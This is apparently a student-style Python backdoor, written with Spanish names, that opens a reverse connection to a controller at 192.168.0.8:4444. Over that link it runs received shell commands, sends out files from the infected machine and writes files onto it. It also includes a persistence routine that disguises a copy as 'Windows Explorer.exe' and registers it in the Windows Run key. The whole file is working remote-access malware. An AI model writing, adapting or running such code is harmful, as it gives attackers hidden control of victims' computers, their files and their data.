import socket, subprocess, json, base64, shutil,os

class BackDoor():
    def __init__(self, ip, port):
        #self.Pesistencia()
        self.connection= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def Pesistencia(self):
        evil_file_location= os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d" + evil_file_location + "", shell=True)

    def Ejecutar_Comando(self, cmd):
        return subprocess.check_output(cmd, shell= True)

    def Enviar(self, data):
        json_data= json.dumps(data)
        self.connection.send(json_data)

    def Recibir(self):
        json_data= ""
        while True:
            try:
                json_data= self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            
    def Cambiar_directorio(self, path):
        os.chdir(path)
        return "[+] Cambiando de directorio a " + path

    def Leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def Escribir_archivo(sefl, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Archivo enviado"

    def Correr_Backdoor(self):
        while True:
            comandos = self.Recibir()
            try:
                if comandos[0] == "salir":
                    self.connection.close()
                    exit()

                elif comandos[0] == "cd" and len(comandos) > 1:
                    resultado_comando= self.Cambiar_directorio(comandos[1])
                elif comandos[0] == "descargar":
                    resultado_comando= self.Leer_archivo(comandos[1])
                elif comandos[0] == "subir":
                    resultado_comando= self.Escribir_archivo(comandos[1], comandos[2])

                else:
                    resultado_comando= self.Ejecutar_Comando(comandos)

            except Exception:
                resultado_comando= "[-] Error al correr el comando"

            self.Enviar(resultado_comando)

        self.connection.close()

os.system("clear")
Puerta= BackDoor("192.168.0.8", 4444)
Puerta.Correr_Backdoor()